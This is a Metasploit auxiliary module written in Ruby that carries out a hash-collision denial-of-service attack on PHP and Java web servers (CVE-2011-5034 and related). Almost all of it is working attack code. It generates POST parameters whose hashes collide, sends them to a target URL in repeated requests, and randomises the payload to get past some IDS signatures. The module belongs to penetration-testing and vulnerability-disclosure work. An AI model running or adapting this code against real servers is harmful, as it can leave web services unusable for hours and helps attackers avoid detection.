##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Hashtable Collisions',
      'Description'   => %q{
        This module uses a denial-of-service (DoS) condition appearing in a variety of
        programming languages. This vulnerability occurs when storing multiple values
        in a hash table and all values have the same hash value. This can cause a web server
        parsing the POST parameters issued with a request into a hash table to consume
        hours of CPU with a single HTTP request.

        Currently, only the hash functions for PHP and Java are implemented.
        This module was tested with PHP + httpd, Tomcat, Glassfish and Geronimo.
        It also generates a random payload to bypass some IDS signatures.
      },
      'Author'        =>
        [
          'Alexander Klink', # advisory
          'Julian Waelde', # advisory
          'Scott A. Crosby', # original advisory
          'Dan S. Wallach', # original advisory
          'Krzysztof Kotowicz', # payload generator
          'Christian Mehlmauer <FireFart[at]gmail.com>' # metasploit module
        ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          ['URL', 'http://www.ocert.org/advisories/ocert-2011-003.html'],
          ['URL', 'http://www.nruns.com/_downloads/advisory28122011.pdf'],
          ['URL', 'http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html'],
          ['URL', 'http://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf'],
          ['URL', 'http://www.youtube.com/watch?v=R2Cq3CLI6H8'],
          ['CVE', '2011-5034'],
          ['CVE', '2011-5035'],
          ['CVE', '2011-4885'],
          ['CVE', '2011-4858']
        ],
      'DisclosureDate'=> 'Dec 28 2011'
    ))

    register_options(
    [
      OptEnum.new('TARGET', [ true, 'Target to attack', nil, ['PHP','Java']]),
      OptString.new('URL', [ true, "The request URI", '/' ]),
      OptInt.new('RLIMIT', [ true, "Number of requests to send", 50 ])
    ], self.class)

    register_advanced_options(
    [
      OptInt.new('RecursiveMax', [false, "Maximum recursions when searching for collisionchars", 15]),
      OptInt.new('MaxPayloadSize', [false, "Maximum size of the Payload in Megabyte. Autoadjust if 0", 0]),
      OptInt.new('CollisionChars', [false, "Number of colliding chars to find", 5]),
      OptInt.new('CollisionCharLength', [false, "Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)", 2]),
      OptInt.new('PayloadLength', [false, "Length of each parameter in the payload", 8])
    ], self.class)
  end

  def generate_payload
    # Taken from:
    # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision

    @recursive_counter = 1
    collision_chars = compute_collision_chars
    return nil if collision_chars == nil

    length = datastore['PayloadLength']
    size = collision_chars.length
    post = ""
    max_value_float = size ** length
    max_value_int = max_value_float.floor
    print_status("#{rhost}:#{rport} - Generating POST data...")
    for i in 0.upto(max_value_int)
      input_string = i.to_s(size)
      result = input_string.rjust(length, "0")
      collision_chars.each do |key, value|
        result = result.gsub(key, value)
      end
      post << "#{Rex::Text.uri_encode(result)}=&"
    end
    return post
  end

  def compute_collision_chars
    print_status("#{rhost}:#{rport} - Trying to find hashes...") if @recursive_counter == 1
    hashes = {}
    counter = 0
    length = datastore['CollisionCharLength']
    a = []
    for i in @char_range
      a << i.chr
    end
    # Generate all possible strings
    source = a
    for i in Range.new(1,length-1)
      source = source.product(a)
    end
    source = source.map(&:join)
    # and pick a random one
    base_str = source.sample
    base_hash = @function.call(base_str)
    hashes[counter.to_s] = base_str
    counter = counter + 1
    for item in source
      if item == base_str
        next
      end
      if @function.call(item) == base_hash
        # Hooray we found a matching hash
        hashes[counter.to_s] = item
        counter = counter + 1
      end
      if counter >= datastore['CollisionChars']
        break
      end
    end
    if counter < datastore['CollisionChars']
      # Try it again
      if @recursive_counter > datastore['RecursiveMax']
        print_error("#{rhost}:#{rport} - Not enough values found. Please start this script again.")
        return nil
      end
      print_status("#{rhost}:#{rport} - #{@recursive_counter}: Not enough values found. Trying again...")
      @recursive_counter = @recursive_counter + 1
      hashes = compute_collision_chars
    else
      print_status("#{rhost}:#{rport} - Found values:")
      hashes.each_value do |item|
        print_status("#{rhost}:#{rport} -\tValue: #{item}\tHash: #{@function.call(item)}")
        item.each_char do |c|
          print_status("#{rhost}:#{rport} -\t\tValue: #{c}\tCharcode: #{c.unpack("C")}")
        end
      end
    end
    return hashes
  end

  # General hash function, Dan "djb" Bernstein times XX add
  def djbxa(input_string, base, start)
    counter = input_string.length - 1
    result = start
    input_string.each_char do |item|
      result = result + ((base ** counter) * item.ord)
      counter = counter - 1
    end
    return result.round
  end

  # PHP's hash function (djb times 33 add)
  def djbx33a(input_string)
    return djbxa(input_string, 33, 5381)
  end

  # Java's hash function (djb times 31 add)
  def djbx31a(input_string)
    return djbxa(input_string, 31, 0)
  end

  def run
    case datastore['TARGET']
      when /PHP/
        @function = method(:djbx33a)
        @char_range = Range.new(0, 255)
        if (datastore['MaxPayloadSize'] <= 0)
          datastore['MaxPayloadSize'] = 8   # XXX: Refactor
        end
      when /Java/
        @function = method(:djbx31a)
        @char_range = Range.new(0, 128)
        if (datastore['MaxPayloadSize'] <= 0)
          datastore['MaxPayloadSize'] = 2   # XXX: Refactor
        end
      else
        raise RuntimeError, "Target #{datastore['TARGET']} not supported"
    end

    print_status("#{rhost}:#{rport} - Generating payload...")
    payload = generate_payload
    return if payload == nil
    # trim to maximum payload size (in MB)
    max_in_mb = datastore['MaxPayloadSize']*1024*1024
    payload = payload[0,max_in_mb]
    # remove last invalid(cut off) parameter
    position = payload.rindex("=&")
    payload = payload[0,position+1]
    print_status("#{rhost}:#{rport} -Payload generated")

    for x in 1..datastore['RLIMIT']
      print_status("#{rhost}:#{rport} - Sending request ##{x}...")
      opts = {
        'method'	=> 'POST',
        'uri'		=> normalize_uri(datastore['URL']),
        'data'		=> payload
      }
      begin
        c = connect
        r = c.request_cgi(opts)
        c.send_request(r)
        # Don't wait for a response, can take hours
      rescue ::Rex::ConnectionError => exception
        print_error("#{rhost}:#{rport} - Unable to connect: '#{exception.message}'")
        return
      ensure
        disconnect(c) if c
      end
    end
  end
end
